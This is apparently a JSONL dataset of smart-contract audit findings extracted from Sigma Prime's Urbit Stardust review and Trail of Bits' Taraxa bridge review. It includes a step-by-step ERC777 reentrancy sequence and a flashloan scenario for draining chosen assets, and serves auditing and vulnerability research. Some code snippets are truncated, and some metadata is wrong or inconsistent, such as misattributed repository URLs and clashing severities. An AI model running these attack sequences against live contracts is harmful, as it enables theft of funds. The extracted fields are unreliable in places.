{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_urbit_stardust_review-005", "doc_id": "sigmaprime_urbit_stardust_review", "finding_index": 5, "page_start": 10, "title": "Lack of Return Value in redeem() Function", "short_summary": null, "description_md": "#### **Description**\n\nThe Treasury contract can be interacted with from *\"externally owned accounts\"* (EOAs) and other smart contracts. When calling the redeem() function, an EOA's UI can track which \\_star it receives from Treasury contract through emitted events.\n\nHowever, a contract account cannot read events data, and therefore, cannot necessarily easily work out what \\_star it receives.\n\nWhat a *redeeming* contract can do is predict what \\_star it will receive from Treasury by retrieving the last item in the Treasury.assets array.\n", "full_markdown": "| UTR-05 | Lack of Return Value in redeem() Function |\n|--------|-------------------------------------------|\n| Asset  | Treasury.sol                              |\n| Status | Open                                      |\n| Rating | Informational                             |\n\narb:market\n\n#### **Description**\n\nThe Treasury contract can be interacted with from *\"externally owned accounts\"* (EOAs) and other smart contracts. When calling the redeem() function, an EOA's UI can track which \\_star it receives from Treasury contract through emitted events.\n\nHowever, a contract account cannot read events data, and therefore, cannot necessarily easily work out what \\_star it receives.\n\nWhat a *redeeming* contract can do is predict what \\_star it will receive from Treasury by retrieving the last item in the Treasury.assets array.\n\n#### **Recommendations**\n\nConsider updating the redeem() function to introduce a return value:\n\n```\nfunction redeem () public returns ( uint16 ) {\n uint16 _star = assets [ assets . length -1];\n require ( azimuth . isOwner (_star , address ( this )));\n```\n\nSuch that a calling contract may catch the return value as follows:\n\n\n\n```\nevent eStarRedeem ( uint16 point );\n require ( treasury . startoken (). balanceOf ( address ( this )) >= ONE_STAR ,\n \" Recipient : STAR balance not enough \");\n uint16 _star = treasury . redeem ();\n```\n\nNote that the snippets above does not account for other suggestions in this report, i.e. changing \\_star data type from uint16 to uint32 for code consistency.\n\nThe recommended change's impact on gas costs is insignificant, that is, from 230*,* 327 gas in the original function to 230*,* 398 gas in the modified function, or 0*.*03% gas increase.\n", "severity": "Low", "difficulty": "Medium", "type": null, "finding_id": "UTR-05", "target": {"path": "/Treasury.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": null, "branch": null, "relative_file": "/Treasury.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:25+00:00", "report_extracted_at": "2025-11-12T02:09:44.825080+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:09:44.827132+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "Medium", "Rating": "Informational", "Finding ID": "UTR-05", "Target": "/Treasury.sol", "Status": "Open", "Asset": "Treasury.sol", "Impact": "Low", "Likelihood": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_urbit_stardust_review-006", "doc_id": "sigmaprime_urbit_stardust_review", "finding_index": 6, "page_start": 12, "title": "Different Star Valuations Motivates Arbitrage and Flashloan", "short_summary": null, "description_md": "#### **Description**\n\nUrbit's stars are NFTs that do not necessarily have equal value, as can be seen on [Opensea](https://opensea.io/collection/urbit-id) where stars are traded at different prices (at the time of writing, the highest asking price for an Urbit star is [888 ETH](https://opensea.io/assets/0x9ef27de616154ff8b38893c59522b69c7ba8a81c/13975) and the lowest is [1.8 ETH\\)](https://opensea.io/assets/0x9ef27de616154ff8b38893c59522b69c7ba8a81c/15828).\n\nOn the other hand, the Treasury contract treats all stars equally from a valuation perspective which opens up two potentially interesting scenarios:\n\n- A user deposits a star with a market price less than 1*e*18 \\$STAR tokens. In this case, the user profits from the difference between the market value and the received \\$STAR tokens. This activity is similar to an arbitrage and can be applied to the DeFi context (would simply require a market pair with \\$STAR token on a decentralised exchange such as Uniswap).\n- A user finds a star worth more than 1*e*18 \\$STAR tokens in the Treasury contract's assets inventory. The user knows that the inventory release is done in *LIFO* (Last In First Out) fashion. To take out the wanted star from the inventory, say in *n-th* position from the last, the user takes a *n*∗ 1*e*18 \\$STAR tokens loan from the market, calls the redeem() function *n* times, keeps the star they want, then returns *n* − 1 stars to the Treasury contract by calling the deposit() function *n* − 1 times. The user then sells the acquired star on the market and pays the loan interest by using profits.\n", "full_markdown": "| UTR-06 | Different Star Valuations Motivates Arbitrage and Flashloan |  |\n|--------|-------------------------------------------------------------|--|\n| Asset  | Treasury.sol                                                |  |\n| Status | Open                                                        |  |\n| Rating | Informational                                               |  |\n\n#### **Description**\n\nUrbit's stars are NFTs that do not necessarily have equal value, as can be seen on [Opensea](https://opensea.io/collection/urbit-id) where stars are traded at different prices (at the time of writing, the highest asking price for an Urbit star is [888 ETH](https://opensea.io/assets/0x9ef27de616154ff8b38893c59522b69c7ba8a81c/13975) and the lowest is [1.8 ETH\\)](https://opensea.io/assets/0x9ef27de616154ff8b38893c59522b69c7ba8a81c/15828).\n\nOn the other hand, the Treasury contract treats all stars equally from a valuation perspective which opens up two potentially interesting scenarios:\n\n- A user deposits a star with a market price less than 1*e*18 \\$STAR tokens. In this case, the user profits from the difference between the market value and the received \\$STAR tokens. This activity is similar to an arbitrage and can be applied to the DeFi context (would simply require a market pair with \\$STAR token on a decentralised exchange such as Uniswap).\n- A user finds a star worth more than 1*e*18 \\$STAR tokens in the Treasury contract's assets inventory. The user knows that the inventory release is done in *LIFO* (Last In First Out) fashion. To take out the wanted star from the inventory, say in *n-th* position from the last, the user takes a *n*∗ 1*e*18 \\$STAR tokens loan from the market, calls the redeem() function *n* times, keeps the star they want, then returns *n* − 1 stars to the Treasury contract by calling the deposit() function *n* − 1 times. The user then sells the acquired star on the market and pays the loan interest by using profits.\n\n#### **Recommendations**\n\nMake sure this behaviour is understood and intended.\n", "severity": "Informational", "difficulty": "High", "type": null, "finding_id": "UTR-06", "target": {"path": "Treasury.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": null, "branch": null, "relative_file": "Treasury.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:25+00:00", "report_extracted_at": "2025-11-12T02:09:44.825080+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:09:44.827132+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Rating": "Informational", "Finding ID": "UTR-06", "Target": "Treasury.sol", "Status": "Open", "Asset": "Treasury.sol", "Impact": "High", "Likelihood": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_urbit_stardust_review-007", "doc_id": "sigmaprime_urbit_stardust_review", "finding_index": 7, "page_start": 13, "title": "Operator Not Supported and Redundant Checks on Function deposit()", "short_summary": null, "description_md": "#### **Description**\n\nThe Ecliptic contracts allows for an operator to perform actions on behalf of a point (or in this context, star) owner, for example, to call the function transferPoint() . This is reflected on line [**457**] of Ecliptic.sol as follows.\n\nWhile Azimuth.canTransfer() is implemented on line [**1098-1108**] of Azimuth.sol as follows:\n\n```\nfunction canTransfer ( uint32 _point , address _who )\n returns ( bool result )\n  Deed storage deed = rights [ _point ];\n  return ( (0 x0 != _who ) &&\n```\n\nThe snippets above indicate that, other than the owner and the transfer proxy, an appointed operator should be allowed to transfer point ownership through the function Ecliptic.transferPoint() .\n\nThis capability is useful if the real owner (EOA) wants to manage their point s in a management contract and wishes to interact with the Treasury contract through that management contract instead of directly from the EOA.\n\nHowever, the following code path on line [**86-90**] in the Treasury contract prevents an operator from depositing a spawned star.\n\n```\nazimuth . getSpawnCount ( _star ) cd == 0 &&\nazimuth . isTransferProxy (_star , address ( this ))\n```\n", "full_markdown": "| UTR-07 | Operator Not Supported and Redundant Checks on Function deposit() |  |  |\n|--------|-------------------------------------------------------------------|--|--|\n| Asset  | Treasury.sol                                                      |  |  |\n| Status | Open                                                              |  |  |\n| Rating | Informational                                                     |  |  |\n\n#### **Description**\n\nThe Ecliptic contracts allows for an operator to perform actions on behalf of a point (or in this context, star) owner, for example, to call the function transferPoint() . This is reflected on line [**457**] of Ecliptic.sol as follows.\n\nWhile Azimuth.canTransfer() is implemented on line [**1098-1108**] of Azimuth.sol as follows:\n\n```\nfunction canTransfer ( uint32 _point , address _who )\n returns ( bool result )\n  Deed storage deed = rights [ _point ];\n  return ( (0 x0 != _who ) &&\n```\n\nThe snippets above indicate that, other than the owner and the transfer proxy, an appointed operator should be allowed to transfer point ownership through the function Ecliptic.transferPoint() .\n\nThis capability is useful if the real owner (EOA) wants to manage their point s in a management contract and wishes to interact with the Treasury contract through that management contract instead of directly from the EOA.\n\nHowever, the following code path on line [**86-90**] in the Treasury contract prevents an operator from depositing a spawned star.\n\n```\nazimuth . getSpawnCount ( _star ) cd == 0 &&\nazimuth . isTransferProxy (_star , address ( this ))\n```\n\n\n\n### **Recommendations**\n\nIf there is no specific reason why only spawned star owners are allowed to call the function deposit() , we recommend adjusting the Treasury contract to enable interactions with appointed operators by changing the condition checking in line [**87**] and line [**89**].\n\nNote that depositing an unspawned star requires direct interaction with the star's prefix owner or its spawn proxy as specified in Azimuth.sol on line [**979-988**] below, and therefore the operator cannot deposit unspawned star.\n\n```\nfunction canSpawnAs ( uint32 _point , address _who )\n returns ( bool result )\n  Deed storage deed = rights [ _point ];\n```\n\nAlso, a set of checks have been conducted in Function Ecliptic.spawn() , and therefore redundant checks can be removed from Treasury.deposit() . A simplified version of the deposit() function could be as follows:\n\n```\nfunction deposit ( uint16 _star )\n public\n   ecliptic . transferPoint (_star , address ( this ), true );\n   ecliptic . spawn (_star , address ( this ));\n  assets . push ( _star );\n```\n", "severity": "Informational", "difficulty": "High", "type": null, "finding_id": "UTR-07", "target": {"path": "Treasury.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": null, "branch": null, "relative_file": "Treasury.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:25+00:00", "report_extracted_at": "2025-11-12T02:09:44.825080+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:09:44.827132+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Rating": "Informational", "Finding ID": "UTR-07", "Target": "Treasury.sol", "Status": "Open", "Asset": "Treasury.sol", "Impact": "High", "Likelihood": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_urbit_stardust_review-008", "doc_id": "sigmaprime_urbit_stardust_review", "finding_index": 8, "page_start": 15, "title": "ERC-777 Related Reentrancy Considerations", "short_summary": null, "description_md": "#### **Description**\n\nThe StarToken contract implements the ERC777 token standard using the related [OpenZeppelin library.](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC777/ERC777.sol) One of the most distinguishable features of the ERC777 standard compared to ERC20 is that if the token receiver is a contract, then the contract can implement the ERC777Recipient interface which defines the function tokensReceived() . This function is a hook that will be triggered every time the contract receives a token. To enable the hook trigger, the receiving contract must register itself to the ERC1820 contract registry.\n\nThis unique ERC777 feature can be weaponised to trigger a **reentrancy** [\\[3\\]](#page-19-3) condition. To be successful, this attack would require the victim contract to be affected by a security flaw as the result of not abiding by the recommended [Checks-Effects-Interactions](https://docs.soliditylang.org/en/v0.8.7/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern.\n\nThis reentrancy condition can allow attackers to use two stars to switch for any other star in the list (see [this](#page-12-1) [relevant issue\\)](#page-12-1).\n\nSay we have assets = [a, b, c] and we have a balance of 2*e*18 StarTokens . The standard redeem() workflow would normally only allow us to redeem the Star c . However, consider the following:\n\n- 1. redeem() **(1)**:\n  - pop(c) -> assets = [a, b]\n  - ownerBurn(1e18) reenter on tokensToSend() before we've burnt our balance of 2*e*18\n- 2. redeem() **(2)**:\n  - pop(b) -> assets = [a]\n  - ownerBurn(1e18) reenter on tokensToSend() before we've burnt our balance of 2*e*18\n- 3. redeem() **(3)**:\n  - pop(a) -> assets = []\n  - ownerBurn(1e18) -> balance = 1*e*18\n  - transferPoint(a, attacker)\n- 4. continue redeem(**2**) :\n  - ownerBurn(1e18) -> balance = 0\n  - transferPoint(b, attacker)\n- 5. deposit(b) :\n  - transferPoint(b, treasury)\n\n\n```\n• push(b) -> assets =[b]\n    • mint(1e18, attacker) -> balance = 1e18\n6. continue redeem(3) :\n    • ownerBurn(1e18) -> balance = 0\n    • transferPoint(c, attacker)\n7. deposit(c) :\n    • transferPoint(c, treasury)\n    • push(c) -> assets = [b, c]\n    • mint(1e18, attacker) -> balance = 1e18\n```\n\nThe attacker managed to own star a and only spend 1*e*18 for it, bypassing the LIFO (*\"Last In First Out\"*) queue.\n\nThe testing team could not identify an exploitable attack vector for reentrancy on the Treasury contract. However, the testing team notes that the ERC777 and ERC1820 contracts were not included in the scope of this review. As a result, the testing team cannot express any opinions related to the security posture of these contracts.\n", "full_markdown": "| UTR-08 | ERC-777 Related Reentrancy Considerations |  |\n|--------|-------------------------------------------|--|\n| Asset  | StarToken.sol                             |  |\n| Status | Open                                      |  |\n| Rating | Informational                             |  |\n\n#### **Description**\n\nThe StarToken contract implements the ERC777 token standard using the related [OpenZeppelin library.](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC777/ERC777.sol) One of the most distinguishable features of the ERC777 standard compared to ERC20 is that if the token receiver is a contract, then the contract can implement the ERC777Recipient interface which defines the function tokensReceived() . This function is a hook that will be triggered every time the contract receives a token. To enable the hook trigger, the receiving contract must register itself to the ERC1820 contract registry.\n\nThis unique ERC777 feature can be weaponised to trigger a **reentrancy** [\\[3\\]](#page-19-3) condition. To be successful, this attack would require the victim contract to be affected by a security flaw as the result of not abiding by the recommended [Checks-Effects-Interactions](https://docs.soliditylang.org/en/v0.8.7/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern.\n\nThis reentrancy condition can allow attackers to use two stars to switch for any other star in the list (see [this](#page-12-1) [relevant issue\\)](#page-12-1).\n\nSay we have assets = [a, b, c] and we have a balance of 2*e*18 StarTokens . The standard redeem() workflow would normally only allow us to redeem the Star c . However, consider the following:\n\n- 1. redeem() **(1)**:\n  - pop(c) -> assets = [a, b]\n  - ownerBurn(1e18) reenter on tokensToSend() before we've burnt our balance of 2*e*18\n- 2. redeem() **(2)**:\n  - pop(b) -> assets = [a]\n  - ownerBurn(1e18) reenter on tokensToSend() before we've burnt our balance of 2*e*18\n- 3. redeem() **(3)**:\n  - pop(a) -> assets = []\n  - ownerBurn(1e18) -> balance = 1*e*18\n  - transferPoint(a, attacker)\n- 4. continue redeem(**2**) :\n  - ownerBurn(1e18) -> balance = 0\n  - transferPoint(b, attacker)\n- 5. deposit(b) :\n  - transferPoint(b, treasury)\n\n\n```\n• push(b) -> assets =[b]\n    • mint(1e18, attacker) -> balance = 1e18\n6. continue redeem(3) :\n    • ownerBurn(1e18) -> balance = 0\n    • transferPoint(c, attacker)\n7. deposit(c) :\n    • transferPoint(c, treasury)\n    • push(c) -> assets = [b, c]\n    • mint(1e18, attacker) -> balance = 1e18\n```\n\nThe attacker managed to own star a and only spend 1*e*18 for it, bypassing the LIFO (*\"Last In First Out\"*) queue.\n\nThe testing team could not identify an exploitable attack vector for reentrancy on the Treasury contract. However, the testing team notes that the ERC777 and ERC1820 contracts were not included in the scope of this review. As a result, the testing team cannot express any opinions related to the security posture of these contracts.\n\n#### **Recommendations**\n\nERC777 token contracts do significantly increase the attack surface available to malicious users, compared to simpler ERC20 token contracts. Consider whether the added complexity is worth the extra features provided.\n", "severity": "High", "difficulty": "High", "type": null, "finding_id": "UTR-08", "target": {"path": "StarToken.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": null, "branch": null, "relative_file": "StarToken.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:25+00:00", "report_extracted_at": "2025-11-12T02:09:44.825080+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:09:44.827132+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "High", "Rating": "Severity: High / Impact: High / Likelihood: High", "Finding ID": "UTR-08", "Target": "StarToken.sol", "Status": "Open", "Asset": "StarToken.sol", "Impact": "High", "Likelihood": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_urbit_stardust_review-009", "doc_id": "sigmaprime_urbit_stardust_review", "finding_index": 9, "page_start": 17, "title": "Miscellaneous Treasury General Comments", "short_summary": null, "description_md": "#### **Description**\n\nThis section details miscellaneous findings discovered by the testing team that do not have direct security implications:\n\n#### 1. **No Clear Revert Message**\n\nThe Treasury contract does not provide clear revert messages upon reverting. Therefore, users or developers may find it hard to track why a transaction fails.\n\nWe suggest introducing the following revert messages:\n\n- line [**81**]: *\"Treasury: Must be a star\"*.\n- line [**122**]: *\"Treasury: Not enough balance\"*.\n- line [**125**]: *\"Treasury: No star available to redeem\"*.\n- line [**132**]: *\"Treasury: Treasury does not own the star asset to redeem\"*.\n\n#### 2. **Redundant Star Ownership Check**\n\nTreasury contract acquires stars from users who called function deposit() . In this function, the deposited stars' ownership is transferred from the users to Treasury contract and stored in assets list.\n\nFunction redeem() redeems a star by burning 1e18 STAR tokens and transfers the ownership of a star from assets list to the redeeming user. However, there is an extra star ownership check in line [**132**] which is not necessary.\n\nAs a recommendation, the code on line [**132**] can safely be removed.\n\n#### 3. **Data Type Unmatched: uint16 for \\_star and uint32 for point**\n\nVariable \\_star used in Treasury contract is a uint16. This variable matches the point variable in the Azimuth and Ecliptic contracts. \\_star and point are of type uint16 and uint32 respectively. Although a \\_star address is represented in [16 bits data,](https://urbit.org/docs/glossary/star) we recommend keeping the \\_star data type to uint32 for code consistency.\n", "full_markdown": "| UTR-09 | Miscellaneous Treasury General Comments |  |\n|--------|-----------------------------------------|--|\n| Asset  | Treasury.sol                            |  |\n| Status | Open                                    |  |\n| Rating | Informational                           |  |\n\n#### **Description**\n\nThis section details miscellaneous findings discovered by the testing team that do not have direct security implications:\n\n#### 1. **No Clear Revert Message**\n\nThe Treasury contract does not provide clear revert messages upon reverting. Therefore, users or developers may find it hard to track why a transaction fails.\n\nWe suggest introducing the following revert messages:\n\n- line [**81**]: *\"Treasury: Must be a star\"*.\n- line [**122**]: *\"Treasury: Not enough balance\"*.\n- line [**125**]: *\"Treasury: No star available to redeem\"*.\n- line [**132**]: *\"Treasury: Treasury does not own the star asset to redeem\"*.\n\n#### 2. **Redundant Star Ownership Check**\n\nTreasury contract acquires stars from users who called function deposit() . In this function, the deposited stars' ownership is transferred from the users to Treasury contract and stored in assets list.\n\nFunction redeem() redeems a star by burning 1e18 STAR tokens and transfers the ownership of a star from assets list to the redeeming user. However, there is an extra star ownership check in line [**132**] which is not necessary.\n\nAs a recommendation, the code on line [**132**] can safely be removed.\n\n#### 3. **Data Type Unmatched: uint16 for \\_star and uint32 for point**\n\nVariable \\_star used in Treasury contract is a uint16. This variable matches the point variable in the Azimuth and Ecliptic contracts. \\_star and point are of type uint16 and uint32 respectively. Although a \\_star address is represented in [16 bits data,](https://urbit.org/docs/glossary/star) we recommend keeping the \\_star data type to uint32 for code consistency.\n\n#### **Recommendations**\n\nEnsure that the comments are understood and acknowledged, and consider implementing the suggestions above.\n\n\nStardust Test Suite\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": "UTR-09", "target": {"path": "Treasury.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": null, "branch": null, "relative_file": "Treasury.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:25+00:00", "report_extracted_at": "2025-11-12T02:09:44.825080+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:09:44.827132+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Rating": "Severity: Low / Impact: Low / Likelihood: Low", "Finding ID": "UTR-09", "Target": "Treasury.sol", "Status": "Open", "Asset": "Treasury.sol", "Impact": "Low", "Likelihood": "Low"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-07-taraxa-bridge-smart-contracts-v2-securityreview-001", "doc_id": "trailofbits_2024-07-taraxa-bridge-smart-contracts-v2-securityreview", "finding_index": 1, "page_start": 9, "title": "Lack of safeTransfer usage for ERC20", "short_summary": null, "description_md": "#### Description\n\nThe applyState function in the ERC20LockingConnectorLogic contract uses the transfer function instead of the safeTransfer function provided by the SafeERC20 library. This can cause tokens whose transfer function does not conform to the ERC20 specification to behave incorrectly. In particular, it could result in no tokens being transferred to a recipient while the contract behaves as though the tokens did get transferred and does not revert, leading to loss of funds.\n\n```\n22 function applyState(bytes calldata _state) public virtual override onlyBridge\n{\n23 Transfer[] memory transfers = decodeTransfers(_state);\n24 uint256 transfersLength = transfers.length;\n25 for (uint256 i = 0; i < transfersLength;) {\n26 IERC20(token).transfer(transfers[i].account, transfers[i].amount);\n27 unchecked {\n28 ++i;\n29 }\n30 }\n31 }\n```\n\n*Figure 1.1: The use of the ERC20 transfer function in [ERC20LockingConnectorLogic.sol#L22-L31](https://github.com/Taraxa-project/bridge/blob/f82dd87c7e23358c74f7dc37451ca61110b60942/src/connectors/ERC20LockingConnectorLogic.sol#L22-L31)*\n", "full_markdown": "| 1. Lack of safeTransfer usage for ERC20       |                              |  |\n|-----------------------------------------------------------------|------------------------------|--|\n| Severity: High                                               | Diffi culty: Medium    |  |\n| Type: Data Validation                                     | Finding ID: TOB-TARA-1 |  |\n| Target: bridge/src/connectors/ERC20LockingConnectorLogic.sol |                              |  |\n\n#### Description\n\nThe applyState function in the ERC20LockingConnectorLogic contract uses the transfer function instead of the safeTransfer function provided by the SafeERC20 library. This can cause tokens whose transfer function does not conform to the ERC20 specification to behave incorrectly. In particular, it could result in no tokens being transferred to a recipient while the contract behaves as though the tokens did get transferred and does not revert, leading to loss of funds.\n\n```\n22 function applyState(bytes calldata _state) public virtual override onlyBridge\n{\n23 Transfer[] memory transfers = decodeTransfers(_state);\n24 uint256 transfersLength = transfers.length;\n25 for (uint256 i = 0; i < transfersLength;) {\n26 IERC20(token).transfer(transfers[i].account, transfers[i].amount);\n27 unchecked {\n28 ++i;\n29 }\n30 }\n31 }\n```\n\n*Figure 1.1: The use of the ERC20 transfer function in [ERC20LockingConnectorLogic.sol#L22-L31](https://github.com/Taraxa-project/bridge/blob/f82dd87c7e23358c74f7dc37451ca61110b60942/src/connectors/ERC20LockingConnectorLogic.sol#L22-L31)*\n\n#### Exploit Scenario\n\nAlice, a user of the Taraxa bridge, wants to transfer her USDT to the Taraxa chain. However, the transfer unexpectedly reverts. Because the error is uncaught, Alice loses her USDT tokens.\n\n#### Recommendations\n\nShort term, use the safeTransfer function of the SafeERC20 library.\n\nLong term, keep up to date with the usage of third-party libraries and ensure that they are used appropriately throughout the codebase.\n", "severity": "High", "difficulty": "Medium", "type": "Data Validation", "finding_id": "TOB-TARA-1", "target": {"path": "bridge/src/connectors/ERC20LockingConnectorLogic.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/Taraxa-project/bridge", "org": "Taraxa-project", "name": "bridge", "commit": "f82dd87c7e23358c74f7dc37451ca61110b60942", "branch": null, "relative_file": "bridge/src/connectors/ERC20LockingConnectorLogic.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-07-taraxa-bridge-smart-contracts-v2-securityreview.pdf", "source_mtime": "2025-11-01T20:47:29.319395+00:00", "report_extracted_at": "2025-11-12T02:10:17.697113+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:10:17.699214+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "Medium", "Type": "Data Validation", "Finding ID": "TOB-TARA-1", "Target": "bridge/src/connectors/ERC20LockingConnectorLogic.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-07-taraxa-bridge-smart-contracts-v2-securityreview-002", "doc_id": "trailofbits_2024-07-taraxa-bridge-smart-contracts-v2-securityreview", "finding_index": 2, "page_start": 10, "title": "The add function can revert", "short_summary": null, "description_md": "#### Description\n\nThe add function in the Maths library fails to account for an arithmetic edge case involving the negation of a signed integer. In particular, the negation of int256.min will revert, as it does not have an appropriate two's complement representation.\n\n```\n5 function add(uint256 a, int256 b) internal pure returns (uint256) {\n6 if (b < 0) {\n7 return a - uint256(-b);\n8 }\n9 return a + uint256(b);\n10 }\n```\n\n*Figure 2.1: The add function in [Maths.sol#L5-L10](https://github.com/Taraxa-project/bridge/blob/f82dd87c7e23358c74f7dc37451ca61110b60942/src/lib/Maths.sol#L5-L10)*\n", "full_markdown": "# 2. The add function can revert Severity: **Informational** Difficulty: **High** Type: Denial of Service Finding ID: TOB-TARA-2 Target: lib/Maths.sol\n\n#### Description\n\nThe add function in the Maths library fails to account for an arithmetic edge case involving the negation of a signed integer. In particular, the negation of int256.min will revert, as it does not have an appropriate two's complement representation.\n\n```\n5 function add(uint256 a, int256 b) internal pure returns (uint256) {\n6 if (b < 0) {\n7 return a - uint256(-b);\n8 }\n9 return a + uint256(b);\n10 }\n```\n\n*Figure 2.1: The add function in [Maths.sol#L5-L10](https://github.com/Taraxa-project/bridge/blob/f82dd87c7e23358c74f7dc37451ca61110b60942/src/lib/Maths.sol#L5-L10)*\n\n### Recommendations\n\nShort term, ensure that the edge case in the library is handled appropriately by using an unchecked block for a b value of int256.min.\n\nLong term, improve unit testing to uncover edge cases and ensure intended behavior throughout the system.\n", "severity": "Informational", "difficulty": "High", "type": "Denial of Service", "finding_id": "TOB-TARA-2", "target": {"path": "lib/Maths.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/Taraxa-project/bridge", "org": "Taraxa-project", "name": "bridge", "commit": "f82dd87c7e23358c74f7dc37451ca61110b60942", "branch": null, "relative_file": "lib/Maths.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-07-taraxa-bridge-smart-contracts-v2-securityreview.pdf", "source_mtime": "2025-11-01T20:47:29.319395+00:00", "report_extracted_at": "2025-11-12T02:10:17.697113+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:10:17.699214+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Type": "Denial of Service", "Finding ID": "TOB-TARA-2", "Target": "lib/Maths.sol"}}
